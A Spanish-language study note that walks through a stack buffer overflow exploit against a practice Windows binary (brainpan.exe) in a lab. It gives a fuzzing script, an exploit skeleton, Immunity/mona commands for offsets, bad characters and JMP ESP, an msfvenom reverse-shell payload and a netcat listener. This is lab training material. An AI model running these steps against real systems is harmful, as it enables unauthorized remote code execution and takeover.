# Buffer Overflow

Propietario: Adrian Gisbert Cabello

PDF Tutorial el pinguino de mario: [https://www.linkedin.com/feed/update/urn:li:activity:7136335409541791747/](https://www.linkedin.com/feed/update/urn:li:activity:7136335409541791747/)

Explicación video Jackie0x17 con y sin badchars y además cómo recibimos la reverseshell si hay más máquinas intermedias:

[https://www.youtube.com/watch?v=K_1mfOzj2wg&t=1471s&ab_channel=Jackie0x17](https://www.youtube.com/watch?v=K_1mfOzj2wg&t=1471s&ab_channel=Jackie0x17)

![Untitled](Buffer%20Overflow%203059001c79d047a2a3820f32ebfa89b3/Untitled.png)

![Untitled](Buffer%20Overflow%203059001c79d047a2a3820f32ebfa89b3/Untitled%201.png)

La máquina Windows 10 que arranquemos en virtual box tiene que tener adaptador puente (igual que la máquina Kali Linux)

Tenemos que tener en la máquina Windows 10 instalado inmunity_debugger.exe y mona.py

- ---------------------------------------------------------------------------------------------------------------------------------------------------------------

En el Kali Linux hacemos un arp-scan -I eth0 --localnet para ver equipos conectados en la misma red, si no hay que hacer un script en python para hacer un escaneo de red:

Script en python para escanear red: `#!/bin/bash for host in $(seq 1 254); do timeout 1 bash -c "ping -c 1 20.20.20.$host &>/dev/null" && echo "[+] HOST - 20.20.20.$host"done; wait`

Observamos puertos abiertos con NMAP: `nmap -p- -sSCV --min-rate 5000 -n -vvv -Pn 192.168.X.X`

En un puerto estará corriendo la aplicación (binario) y en otro puerto hay que llegar a obtener ese .exe que ejecuta el binario (mediante fuzzing, en una web, etc.)

Fuzzing web (directorios): gobuster dir -u [http://192.168.X.X:XXXXX](http://192.168.X.X:XXXXX) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

Fuzzing web (archivos): gobuster dir -u [http://192.168.X.X:XXXXX](http://192.168.X.X:XXXXX) -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -x .txt .exe .php .html

Encontramos un archivo brainpan.exe, nos lo descargamos, abrimos un servidor html con python en Kali en la misma carpeta donde tengamos el .exe: python3 -m http.server 80

Miramos la IP de la máquina que tiene Kali Linux y nos dirigimos a la máquina Windows e introducimos la ip en el navegador y nos descargamos el archivo .exe

Nos creamos un directorio de trabajo en el escritorio de windows y ponemos el binario .exe

Ahora en windows tenemos que tener copiado el archivo mona.py en el directorio C:**\**Archivos de programa (x86)**\**Immunity Inc**\**Immunity Debugger**\**PyCommands

Abrimos Immunity Debugger y cargamos el archivo .exe

Vemos que si hacemos un escaneo de nmap pero esta vez a la ip de nuestra máquina Windows, encontraremos que hay abierto el mismo puerto que estaba abierto en la máquina víctima y si accedemos a él, está corriendo el binario también. Esto nos servirá para realizar todas las pruebas hasta encontrar el binario que revienta el búffer de la máquina víctima

Establecemos el directorio donde está el binario y lo establecemos como directorio de trabajo: !mona config -set workingfolder C:**\**Users**\**adrian**\**Desktop**\**bof

Volvemos a ampliar la pestaña que tiene cuatro ventanas

Vamos a la Kali al terminal y utilizamos un script (nano fuzzing.py):

- ---------------------------------------------------------------------------------------------------------------------------------------------------------------

`#!/usr/bin/env python3`

`import socket, time, sys`

`ip = "192.168.0.39"`

`port = 9999`

`timeout = 1`

`prefix = ""`

`string = prefix + "A" * 100`

`while True:`

`try:`

`with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:`

`s.settimeout(timeout)`

`s.connect((ip, port))`

`s.recv(1024)`

`print("Fuzzing with {} bytes".format(len(string) - len(prefix)))`

`s.send(bytes(string, "latin-1"))`

`s.recv(1024)`

`except:`

`print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))`

`sys.exit(0)`

`string += 100 * "A"`

`time.sleep(1)`

- ---------------------------------------------------------------------------------------------------------------------------------------------------------------

Cambiamos la IP por la de la máquina windows y el puerto por si hay que modificarlo

Ejecutamos con python3 fuzzing.py y observamos que crashea por ejemplo a los 600 bytes y lo anotamos

Abrimos el immunity debugger y hay que ver el número de EIP y apuntamos el número

Lo ejecutamos y vemos que el programa crashea a los 600 bytes:

Una vez ejecutado vemos que el EIP marca 414141, lo cual es lo que debe ocurrir:

OBTENER EL OFFSET

Una vez obtenido el punto exacto donde crashea el programa, vamos a necesitar el

offset; y para ello vamos a enviar un número de esa data algo mayor, por lo que por

ejemplo vamos a sumar +400 bytes.

Creamos otro script en el Kali (nano exploit.py):

- ---------------------------------------------------------------------------------------------------------------------------------------------------------------

`import socket`

`ip = "MACHINE_IP"`

`port = 1337`

`prefix = "OVERFLOW1 "`

`offset = 0`

`overflow = "A" * offset`

`retn = ""`

`padding = ""`

`payload = ""`

`postfix = ""`

`buffer = prefix + overflow + retn + padding + payload + postfix`

`s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)`

`try:`

`s.connect((ip, port))`

`print("Sending evil buffer...")`

`s.send(bytes(buffer + "\r\n", "latin-1"))`

`print("Done!")`

`except:`

`print("Could not connect.")`

- ---------------------------------------------------------------------------------------------------------------------------------------------------------------

Ponemos la ip de la máquina windows y el puerto por el que corre el binario

Ejecutamos un comando para metasploit para que nos genere una cantidad de bytes (hay que añadir el número de bytes en el que crasheaba + 400, en este caso son 600 + 400 = 1000): /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000

Copiamos los bytes que nos ha generado y los pegamos en el parámetro payload (dentro de las comillas ¨¨) del script exploit.py

Guardamos el script, abrimos immunity debugger y establecemos con mona el punto exacto donde crashea el .exe: !mona findmsp -distance 600

Minimizamos la ventana de letras verdes y ampliamos la ventana cuádruple, ahora está colapsado, abrimos otra vez el archivo .exe y le damos al play

Vamos al Kali y ejecutamos el exploit.py: python3 exploit.py

Vamos al immunity y vemos quie ha crasheado de nuevo, hay que copiar el nuevo número EIP

En el Kali, volvemos a usar una herramienta de metasploit para calcular el offset: /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q Número_EIP

Apuntamos el número de offset y editamos el exploit.py: Cambiamos el 0 por el número que nos ha dado. También añadimos en retn = ¨BBBB¨ y Guardamos

Abrimos Immunity y volvemos a abrir el archivo .exe y le damos al play

En la Kali ejecutamos el exploit: python3 exploit.py

En immunity debugger si ha crasheado y el EIP sale igual que la primera vez es buena señal, tenemos el control del binario

Ahora toca el tema de los bad chars:

Vamos al kali e instalamos los badchars: pip install badchars

Si ahora ejecutamos el comando badchars -f python; podemos observar todos los posibles badchars que existen, luego lo veremos

Copiamos todo lo que hay entre (), editamos exploit.py y lo pegamos en payload (sin las dos dobles comillas que hay). Guardamos el exploit.py

Vamos al Immunity y ejecutamos el comando para identificar los badchars:  !mona bytearray -b ¨**\**x00¨ (nos habrá creado unos ficheros en nuestro directorio de trabajo bof, usaremos más adelante el archivo bytearray.bin)

Minimizamos la ventana de letras verdes y ampliamos la ventana cuádruple

Abrimos el archivo .exe y le damos al play

Vamos al kali y ejecutamos el exploit.py: python3 exploit.py

Ahora vuelve a crashear Immunity, y hay que apuntar el número ESP

Ejecutamos en Immunity el siguiente comando: !mona compare -f C:\Users\adrian\Desktop\bof\bytearray.bin -a Número_ESP

- --------------------------------------------------------------------------------------------------------------------------------------------

Si no nos sale que tenga badchars (a excepción del \x00 que ese siempre es bad char), genial

Si nos salen badchars, abría que editar el exploit.py y eliminarlos de la cadena donde esten en el parámetro payload (*)

MUY IMPORTANTE, si por ejemplo nos salen en el cuadro de badchars 01 02, tenemos que apuntar el 02 (porque el anterior no sirve), entonces los badchars serían: "\x00\x02"

Tendremos que modificar el script exploit.py y quitar el badchar "\x02" y volvemos a ejecutar los pasos anteriores:

Minimizamos la ventana de letras verdes y ampliamos la ventana cuádruple

Abrimos el archivo .exe y le damos al play

Vamos al kali y ejecutamos el exploit.py: python3 exploit.py

Ahora vuelve a crashear Immunity, y hay que apuntar el número ESP

Ejecutamos en Immunity el siguiente comando: !mona compare -f C:\Users\adrian\Desktop\bof\bytearray.bin -a Número_ESP

Repetimos este proceso hasta que ya no nos salgan más badchars

- --------------------------------------------------------------------------------------------------------------------------------------------

Abrimos el Immunity y ejecutamos el siguiente comando: !mona jmp -r esp -cpb "\x00"      (*) Si tenemos más badchars hay que añadirlos p.ej.  "\x00\x02"

Se abre una pestaña muy pequeña y la maximizamos y donde dice en rojo: Found a total of 1 pointer     Tenemos que copiar el número que hay arriba

Minimizamos y abrimos la ventana cuádruple, le damos al botón flecha derecha azul oscuro e introducimos ese número copiado

Se nos marca en azul una fila, copiamos el primer número del pointer que sale de la fila (por ejemplo es: 311712F3)

Editamos el exploit.py y en el parámetro retn, sustituimos las BBBB por el número del pointer 311712F3, pero hay que ponerlo de la siguiente manera: ¨\xf3\x12\x17\x31¨

En la parámetro de padding lo dejamos así: ¨\x90¨ * 16

Guardamos el exploit.py

- --------------------------------------------------------------------------------------------------------------------------------------------

Generamos el shellcode con msfvenom: msfvenom -p windows/shell_reverse_tcp LHOST=IP_KALI_LINUX_ATACANTE LPORT=4444 EXITFUNC=thread -b "\x00" -f c

(*) Si teníamos más badchars hay que especificarlos en el parámetro -b  (p.ej.  -b "\x00\x02")

Copiamos el shellcode desde las ¨¨ hasta menos el ;

Editamos el exploit.py y editamos el parámetro payload (tiene que estar entre paréntesis)          payload = (¨SHELLCODE COPIADO¨)

También editamos la IP y el puerto que teníamos puesta la de nuestra máquina Windows y ponemos la de la máquina víctima.

Guardamos

- --------------------------------------------------------------------------------------------------------------------------------------------

En el Kali, en una nueva terminal, nos ponemos en escucha con netcat por el puerto configurado en msfvenom (en este ejemplo es 4444): nc -nlvp 4444

Ejecutamos el exploit: python3 exploit.py

Recibimos la reverseshell

- --------------------------------------------------------------------------------------------------------------------------------------------

Si no tenemos conexión directa y está a través de máquinas intermedias:

![Untitled](Buffer%20Overflow%203059001c79d047a2a3820f32ebfa89b3/Untitled%202.png)